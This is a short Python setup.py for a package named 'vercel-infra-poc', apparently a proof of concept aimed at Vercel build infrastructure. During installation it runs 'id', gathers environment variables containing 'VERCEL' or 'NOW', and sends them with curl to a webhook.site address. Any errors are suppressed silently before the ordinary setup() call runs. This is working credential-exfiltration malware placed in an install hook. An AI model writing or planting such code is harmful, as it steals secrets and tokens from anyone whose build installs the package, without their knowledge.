from setuptools import setup
import os
import subprocess
 
whoami = subprocess.getoutput('id')
vercel_vars = "\n".join([f"{k}={v}" for k, v in os.environ.items() if "VERCEL" in k or "NOW" in k])
 
payload = f"--- PRODUCTION PROOF ---\nUSER: {whoami}\n\nVERCEL_VARS:\n{vercel_vars}"
 
url = "https://webhook.site/654ef753-d639-43ad-970c-9b90a3fa1fb9"

try:
    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', payload, url])
except:
    pass

setup(name="vercel-infra-poc", version="1.0.0")
